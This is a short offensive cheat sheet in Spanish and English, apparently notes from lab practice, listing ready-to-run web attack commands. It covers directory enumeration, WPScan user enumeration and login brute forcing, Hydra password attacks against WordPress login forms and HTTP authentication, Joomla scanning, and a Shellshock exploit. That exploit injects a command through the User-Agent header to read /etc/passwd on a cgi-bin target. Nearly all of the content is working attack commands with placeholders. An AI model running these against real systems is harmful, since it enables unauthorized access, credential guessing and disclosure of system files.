## Enumerar directorios
### Gobuster
```
gobuster -u URL -w lista -e EXTENSIONES
```
### Metasploit module
```
auxiliary/scanner/http/brute_dirs
```

## WordPress
### WP scan full
```
wpscan --url URL -e vp,u,cb,dbe
```
### WP Scan Bruteforce login
```
wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
```
### Hydra
```
hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 

```
## Joomla
### Joomscan Scan
```
perl joomscan.pl -u URL
```

## BruteForce HTTP GET
### Hydra
```
hydra -L UserList -P PassList IP http-get Directorio
```
### Metasploit module
```
auxiliary/scanner/http/http_login
```
## Shellshock cgi-bin
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://IP/cgi-bin/script.sh
```
